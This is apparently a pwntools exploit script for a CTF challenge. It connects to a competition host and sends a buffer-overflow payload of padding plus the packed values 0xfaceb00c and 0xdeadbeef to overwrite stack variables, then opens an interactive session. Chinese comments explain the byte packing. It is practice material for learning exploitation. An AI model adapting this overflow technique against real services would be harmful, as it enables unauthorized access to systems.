#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import time
host="ctf.adl.csie.ncu.edu.tw"
port="11002"

r=remote(host,port)

face = 0xfaceb00c
dead = 0xdeadbeef
pw = 0x1

#print(hex(u64(p64(goal))))
#p64可以把一個64進位的位址值打包成\x形式的string
payload = 'a'*12 + p32(face) + p32(dead) + p32(pw)
#print payload 

#0x7fffffffe378 >> return位址
print(r.recvuntil("\n"))
r.sendline(payload)
r.interactive()
